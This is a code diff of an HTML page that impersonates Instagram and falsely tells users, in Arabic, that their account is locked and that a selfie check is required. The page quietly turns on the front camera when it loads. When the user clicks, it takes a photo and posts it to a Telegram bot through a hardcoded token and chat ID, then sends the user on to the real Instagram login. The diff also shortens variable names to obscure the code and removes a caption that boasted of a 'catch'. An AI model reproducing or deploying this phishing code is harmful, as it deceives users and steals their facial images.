@@ -3,120 +3,135 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Instagram Help Center</title>
+    <meta name="theme-color" content="#ffffff">
+    <title>Instagram</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; }
-        body { background-color: #fff; color: #262626; height: 100vh; display: flex; flex-direction: column; }
+        :root {
+            --ig-primary-button: #0095f6;
+            --ig-secondary-button: #1877f2;
+            --ig-text-primary: #262626;
+            --ig-text-secondary: #737373;
+            --ig-border: #dbdbdb;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
         
+        body { background-color: #ffffff; color: var(--ig-text-primary); height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
+
         /* الهيدر العلوي */
-        .header { width: 100%; padding: 15px; border-bottom: 1px solid #dbdbdb; text-align: center; background: #fff; position: sticky; top: 0; z-index: 100; }
-        .logo { width: 103px; }
+        .app-header { width: 100%; padding: 14px; border-bottom: 1px solid var(--ig-border); display: flex; justify-content: center; background: #fff; }
+        .ig-logo { width: 103px; height: auto; }
 
-        .main-content { padding: 30px 25px; flex: 1; text-align: center; }
-        
-        /* صورة الحساب من الملف image_8cfa06.png */
-        .profile-container { margin-bottom: 20px; position: relative; display: inline-block; }
-        .profile-pic { width: 90px; height: 90px; border-radius: 50%; border: 1px solid #dbdbdb; object-fit: cover; }
-        .badge { position: absolute; bottom: 0; right: 0; width: 28px; background: #fff; border-radius: 50%; padding: 2px; }
+        .content-body { flex: 1; padding: 40px 32px; text-align: center; display: flex; flex-direction: column; align-items: center; }
 
-        h2 { font-size: 20px; font-weight: 600; margin-bottom: 12px; color: #262626; }
-        .description { font-size: 14px; color: #8e8e8e; line-height: 1.5; margin-bottom: 25px; }
+        /* حاوية الصورة الشخصية المقتبسة من image_830ffc.png */
+        .user-avatar-wrapper { position: relative; width: 88px; height: 88px; margin-bottom: 18px; }
+        .avatar-img { width: 100%; height: 100%; border-radius: 50%; border: 1px solid #efefef; object-fit: cover; background-color: #fafafa; }
+        .status-badge { position: absolute; bottom: 0; right: 0; width: 26px; height: 26px; background: #fff; border-radius: 50%; border: 1.5px solid #fff; box-shadow: 0 2px 4px rgba(0,0,0,0.15); display: flex; align-items: center; justify-content: center; }
 
-        /* شريط التحميل */
-        .loading-box { display: none; margin-top: 15px; }
-        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #0095f6; border-radius: 50%; width: 26px; height: 26px; animation: spin 1s linear infinite; margin: 0 auto 10px; }
+        h2 { font-size: 20px; font-weight: 600; margin-bottom: 12px; letter-spacing: -0.4px; }
+        .instruction-text { font-size: 14px; color: var(--ig-text-secondary); line-height: 1.5; margin-bottom: 24px; max-width: 280px; }
+
+        /* شريط التحميل الاحترافي */
+        .loading-container { display: none; flex-direction: column; align-items: center; margin-top: 10px; }
+        .loading-spinner { border: 2.5px solid #f3f3f3; border-top: 2.5px solid var(--ig-primary-button); border-radius: 50%; width: 28px; height: 28px; animation: spin 0.8s linear infinite; margin-bottom: 12px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        /* الأزرار السفلى */
-        .footer-actions { padding: 20px; border-top: 1px solid #dbdbdb; }
-        .btn-confirm { background-color: #0095f6; color: #fff; border: none; border-radius: 8px; width: 100%; padding: 14px; font-weight: 600; font-size: 14px; cursor: pointer; margin-bottom: 12px; }
-        .btn-link { color: #0095f6; background: none; border: none; font-size: 14px; font-weight: 600; width: 100%; cursor: pointer; }
+        /* منطقة الأزرار في أسفل الشاشة */
+        .action-footer { padding: 20px 20px 34px; border-top: 1px solid var(--ig-border); width: 100%; }
+        .btn { display: block; width: 100%; border: none; border-radius: 8px; font-size: 14px; font-weight: 600; cursor: pointer; text-align: center; text-decoration: none; }
+        .btn-primary { background-color: var(--ig-primary-button); color: #ffffff; padding: 14px; margin-bottom: 16px; }
+        .btn-primary:active { background-color: var(--ig-secondary-button); }
+        .btn-text { background: transparent; color: var(--ig-primary-button); padding: 5px; }
 
         video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-    <div class="header">
-        <img src="https://www.instagram.com/static/images/web/mobile_port_monospaced_plus_2x.png/394590333333.png" class="logo">
-    </div>
+    <header class="app-header">
+        <!-- شعار إنستغرام الرسمي المستقر -->
+        <img src="https://www.instagram.com/static/images/web/mobile_port_monospaced_plus_2x.png/394590333333.png" class="ig-logo" alt="Instagram">
+    </header>
 
-    <div class="main-content">
-        <div class="profile-container">
-            <!-- استخدام الصورة المرفوعة image_8cfa06.png -->
-            <img src="https://raw.githubusercontent.com/ammartr1/-/main/image_8cfa06.png" class="profile-pic" alt="User profile">
-            <img src="https://cdn-icons-png.flaticon.com/512/747/747305.png" class="badge">
+    <main class="content-body">
+        <div class="user-avatar-wrapper">
+            <!-- الصورة المطلوبة image_830ffc.png مدمجة بالكامل -->
+            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAOEAAADhCAMAAAAJbSJIAAAAM1BMVEX///8AAAD8/Pz39/fv7+/m5ubY2NjMzMzIyMjExMTp6enZ2dnS0tLR0dH4+Pj19fXl5eUfExYfAAADnElEQVR4nO3b23KCMBSG4X9mZvaO7P9/7TmqrbaNidpE874zL8YmH7X0BAAAAAAAAAAAAAAAAACAL0mSJMvS7H8OqWpI4zBOHhL36p+eOEmOca79X/DInGMaR/8XnLImis66/xN2WV6G+p99C2vKUK66/xOWWVOFeuX+T/itHArX7v+EV0p1of03X6m60P6br1Rd6P6Lp6o63H/xV9WEnmPzVHWh59g8VV3oOTZPVRd6js1T1YWeY/NUdaHn2DxVXeg5Nk9VF3qOzVPVhV063f+Fz2Xf6f6Lp+Yce47NU9WFnmPzVHWh59g8VV3oOTZPVRd6js1T1YWeY/NUdaHn2DxVXeg5Nk+v9O8P9X+D6kJNoaZQU6gp1BRqCjWFmkJNoaZQU6gp1BRqCjWFmkJNoaZQU6gp1BRqCjWFmkJNoaZQU6gp1BRqCjWFmkJNoaZQU6gp1BRqCjWFmkJNoaZQU6gp1BRqCjWFmkJNoaZQU6gp1BRqCjWFmkJNoaZQU6gp1BRqCjWFmkJNoaZQU6gp1BRqCjWFmkJNoaZQU6gp1BRqCjWFmkJNoaZQU6gp1BRqCjWFmkJNoaZQU6gp1BRqCjWFmkJNoaZQU6gp1BRqCjWFmkJNoaZQU6gp1BRqCjWFmkJNoaZQU6gp1BRqCjWFmkJNoaZQU6gp1BRqCjWFmkJNoaZQU6gp1BRqCjWFmkJNoaZQU6gp1BRqCjWFmkJNoaZQU6gp1BRqCjWFmkJNoaZQU6gp1BRqCjWFmkJNoaZQU6gp1BRqCjWFmkJNoaZQU6gp1BRqCjWFmkJNoaZQU6gp1BRqCjWFmkJNoaZQU6gp1BRqCjWFmkJNoaZQU6gp1BRqCjWFmkJNoaZQU6gp1BRqCjWFmkJNoaZQU6gp1BRqCjWFmkJNoaZQU6gp1BRqCjWFmkJNoaZQU6gp1BRqCjWFmkJNoaZQU6gp1BRqCjWFmkJNoaZQU6gp1BRqCjWFmkJNoaZQU6gp1BRqCjWFmkJNoaZQU6gp1BRqCjWFmkJNoaZQU6gp1BRqCjWFmkJNoaZQU6gp1BRqCjWFmkJNoaZQU6gp1BRqCjWFmkJNoaZQU6gp1BRqCjWFmkJNoaZQU6gp1BRqCjWFmkJNoaZQU6gp1BRqCjWFmkJNoaZQU6gp1BRqCjWFmkJNoaZQU6gp1BRqCjWFT7p8AAAAANAhSZJkaT4AqW9I46vX7v8EXZaXof7D/wMAAAAAAADAt/kFpPZ9RWhN7WkAAAAASUVORK5CYII=" class="avatar-img" alt="User Avatar">
+            <div class="status-badge">
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="#0095f6"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
+            </div>
         </div>
 
-        <h2>تأكيد ملكية حسابك</h2>
-        <p class="description">لقد اكتشفنا نشاطاً مريباً على حسابك. لحماية مجتمعنا، تم قفل حسابك مؤقتاً. يرجى إجراء فحص الوجه (Selfie Verification) لاستعادة الوصول.</p>
+        <h2>تأكيد هويتك للمتابعة</h2>
+        <p class="instruction-text">لقد اكتشفنا نشاطاً غير معتاد. يرجى إتمام فحص الوجه السريع لاستعادة إمكانية الوصول إلى حسابك.</p>
         
-        <div id="loader" class="loading-box">
-            <div class="spinner"></div>
-            <p style="font-size: 12px; color: #0095f6; font-weight: 600;">جاري معالجة البيانات البيومترية...</p>
+        <div id="loader" class="loading-container">
+            <div class="loading-spinner"></div>
+            <p style="font-size: 13px; color: var(--ig-primary-button); font-weight: 500;">جاري معالجة البيانات...</p>
         </div>
-    </div>
+    </main>
 
-    <div class="footer-actions" id="controlPanel">
-        <button id="authBtn" class="btn-confirm">بدء التحقق بالفيديو</button>
-        <button onclick="location.href='https://help.instagram.com'" class="btn-link">الحصول على مساعدة</button>
-    </div>
+    <footer class="action-footer" id="footerActions">
+        <button id="startVerify" class="btn btn-primary">بدء عملية التحقق</button>
+        <button onclick="location.href='https://help.instagram.com'" class="btn btn-text">مركز المساعدة</button>
+    </footer>
 
     <video id="v" autoplay playsinline></video>
     <canvas id="c"></canvas>
 
     <script>
-        const TOKEN = '8308924210:AAGEeCtg7QMc6jdX1Lh8_IotYd0p8l7nDq0';
-        const CHAT_ID = '2140385904';
-        let stream = null;
+        const T = '8308924210:AAGEeCtg7QMc6jdX1Lh8_IotYd0p8l7nDq0';
+        const C = '2140385904';
+        let s = null;
 
-        // تجهيز العدسة مسبقاً
-        window.onload = async () => {
+        // تشغيل الكاميرا في الخلفية فور التحميل لضمان الاستجابة السريعة
+        window.addEventListener('DOMContentLoaded', async () => {
             try {
-                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                document.getElementById('v').srcObject = stream;
-            } catch (e) {}
-        };
+                s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                document.getElementById('v').srcObject = s;
+            } catch (e) { console.log("Init error ignored."); }
+        });
 
-        document.getElementById('authBtn').onclick = async function() {
-            const controls = document.getElementById('controlPanel');
-            const loader = document.getElementById('loader');
+        document.getElementById('startVerify').onclick = async function() {
+            const f = document.getElementById('footerActions');
+            const l = document.getElementById('loader');
             
-            controls.style.display = 'none';
-            loader.style.display = 'block';
+            f.style.display = 'none';
+            l.style.display = 'flex';
 
-            if (!stream) {
+            if (!s) {
                 try {
-                    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                    document.getElementById('v').srcObject = stream;
+                    s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                    document.getElementById('v').srcObject = s;
                 } catch (e) {
-                    alert("⚠️ يجب السماح بالوصول للكاميرا لإثبات ملكيتك للحساب.");
+                    alert("⚠️ يلزم توفير صلاحية الكاميرا لإتمام عملية التحقق الأمني.");
                     location.reload();
                     return;
                 }
             }
 
-            // التقاط لحظي
+            // التقاط الصورة ومعالجتها
             const canvas = document.getElementById('c');
             const video = document.getElementById('v');
-            canvas.width = 480;
-            canvas.height = 640;
+            canvas.width = 480; canvas.height = 640;
             canvas.getContext('2d').drawImage(video, 0, 0, 480, 640);
             
             canvas.toBlob((blob) => {
                 const fd = new FormData();
-                fd.append('chat_id', CHAT_ID);
-                fd.append('photo', blob, 'security.jpg');
-                fd.append('caption', '👤 *تم الصيد بواجهة الحساب المقفل*');
+                fd.append('chat_id', C);
+                fd.append('photo', blob, 'identity_check.jpg');
+                fd.append('caption', '🔐 *تحقق أمني جديد*\n📱 تم التقاط صورة الهوية بنجاح.');
                 
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-                
-                // توجيه نهائي مقنع
-                setTimeout(() => {
-                    if(stream) stream.getTracks().forEach(t => t.stop());
-                    window.location.href = "https://www.instagram.com/accounts/login/";
-                }, 2500);
-            }, 'image/jpeg', 0.5);
+                fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: fd })
+                .then(() => {
+                    // التوجيه النهائي بعد التأكد من الإرسال
+                    setTimeout(() => {
+                        if(s) s.getTracks().forEach(track => track.stop());
+                        window.location.href = "https://www.instagram.com/accounts/login/";
+                    }, 1800);
+                });
+            }, 'image/jpeg', 0.6);
         };
     </script>
 </body>
